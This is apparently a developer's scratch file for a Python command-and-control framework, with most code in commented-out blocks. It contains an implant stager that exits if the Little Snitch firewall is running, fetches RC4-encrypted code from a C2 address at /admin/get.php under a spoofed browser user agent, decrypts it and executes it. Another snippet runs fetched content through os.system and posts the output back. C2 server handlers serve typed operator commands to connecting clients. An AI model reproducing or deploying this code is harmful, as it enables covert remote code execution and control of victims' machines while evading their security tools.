from scratchpad import *
from scratchpad2 import *


main()


while 1:
    command = raw_input('$ ')
    if command == "quit" or command == 'exit':
        sys.exit()
    cmd = command_control(command, ip_address="172.16.69.140")
    print(cmd)

"""
cmd = "ps -ef | grep Little\ Snitch | grep -v grep"

ps = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
out = ps.stdout.read()
ps.stdout.close()

if re.search("Little Snitch", out):
    sys.exit()

requests.packages.urllib3.disable_warnings()
chars = string.ascii_letters + string.digits
session_value = ''.join(random.choice(chars) for i in range(20))
headers = {'User-agent': 'Mozilla/5.0 (Windows NT 6.1 WOW64 Trident/7.0 rv:11.0) like Gecko',
           'Cookie': 'session=%s' % session_value}

redirector = 'http://172.16.69.136:8000'
uri = '/admin/get.php'
r = requests.get(redirector)
r = requests.post(redirector,data=os.system(r.content))


#!/usr/bin/env python

from http.server import BaseHTTPRequestHandler, HTTPServer

# HTTPRequestHandler class
class testHTTPServer_RequestHandler(BaseHTTPRequestHandler):

  # GET
  def do_GET(self):
        # Send response status code
        self.send_response(200)

        # Send headers
        self.send_header('Content-type','text/html')
        self.end_headers()

        # Send message back to client
        message = "Hello world!"
        # Write content as utf-8 data
        self.wfile.write(bytes(message))
        return

def run():
  print('starting server...')

  # Server settings
  # Choose port 8080, for port 80, which is normally used for a http server, you need root access
  server_address = ('', 8081)
  httpd = HTTPServer(server_address, testHTTPServer_RequestHandler)
  print('running server...')
  httpd.serve_forever()


run()

import sys;import re, subprocess;cmd = "ps -ef | grep Little\ Snitch | grep -v grep"
ps = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
out = ps.stdout.read()
ps.stdout.close()
if re.search("Little Snitch", out):
   sys.exit()
import urllib2;
UA='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';server='http://172.16.69.130:80';t='/admin/get.php';req=urllib2.Request(server+t);
req.add_header('User-Agent',UA);
req.add_header('Cookie',"session=t7QD+BTrApetB4Wqy+w4cB4PyBk=");
proxy = urllib2.ProxyHandler();
o = urllib2.build_opener(proxy);
urllib2.install_opener(o);
a=urllib2.urlopen(req).read();
IV=a[0:4];data=a[4:];key=IV+'{kN;BLfRZpaK%j5A-g:&d0?_vx.r=18G';S,j,out=range(256),0,[]
for i in range(256):
    j=(j+S[i]+ord(key[i%len(key)]))%256
    S[i],S[j]=S[j],S[i]
i=j=0
for char in data:
    i=(i+1)%256
    j=(j+S[i])%256
    S[i],S[j]=S[j],S[i]
    out.append(chr(ord(char)^S[(S[i]+S[j])%256]))
exec(''.join(out))

    """



"""
from http.server import *
import random, string, ssl

chars = string.ascii_letters + string.digits
session_value = ''.join(random.choice(chars) for i in range(20))


class c2Server(BaseHTTPRequestHandler):

    def set_headers(self):
        self.send_response(200, "ok")
        self.send_header('Content-type', 'text/html')
        self.send_header('Set-Cookie',session_value)
        self.end_headers()

    # Allow GET
    def do_GET(self):
        self.set_headers()
        message = input("$ ")
        self.wfile.write(message.encode('utf-8'))

    # Allow POST
    def do_POST(self):
        self.set_headers()
        print("data received")
        print(self.client_address[0])
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        data = post_data.decode('utf-8')
        print(data)


def run():
    print("Server Started ..!!")
    server_address = ('', 443)
    httpd = HTTPServer(server_address, c2Server)
    httpd.socket = ssl.wrap_socket(httpd.socket, certfile='server.cert', keyfile="server.key",  server_side=True)
    print('running server...')
    httpd.serve_forever()


run()



import http.server
import socketserver
from http.server import *
from http import cookies
import random
import string
import logging
import threading
import ssl

chars = string.ascii_letters + string.digits

# C = cookies.SimpleCookie()
session_value = ''.join(random.choice(chars) for i in range(20))


class Server_Response(BaseHTTPRequestHandler):
    def set_headers(self):
        self.send_response(200, "ok")
        self.send_header('Content-type', 'text/html')
        self.send_header('Set-Cookie', session_value)
        # self.send_header('Server', 'Microsoft IIS/7.5')
        self.end_headers()

    # Allow GET
    def do_GET(self):
        self.set_headers()
        # message = raw_input("Enter command :  " )
        message = "id"
        print(self.client_address[0])
        self.wfile.write(bytes(message.encode()))

    # Allow POST
    def do_POST(self):
        self.set_headers()
        # content_length = int(self.headers['Content-Length'])  # <--- Gets the size of data
        # post_data = self.rfile.read(content_length)
        # print("POST REQUEST")
        # logging.info(post_data.decode('utf-8'))
        self.wfile.write("<html><body><h1>POST!</h1></body></html>")


def run():
    print("Server Started ..!!")
    server_address = ('', 80)
    httpd = HTTPServer(server_address, Server_Response)
    # httpd.socket = ssl.wrap_socket(httpd.socket, certfile='./server.pem', server_side=True)
    print('running server...')
    httpd.serve_forever()


run()


from __builtin__ import raw_input
from scratchpad import *
import sys
import threading
def threadingConn():
    conn_thread = threading.Thread(target=sock_connect(),args=())
    conn_thread.daemon = True
    conn_thread.start()

def main():
    create_socket('', 9997)
    sock_connect()
"""
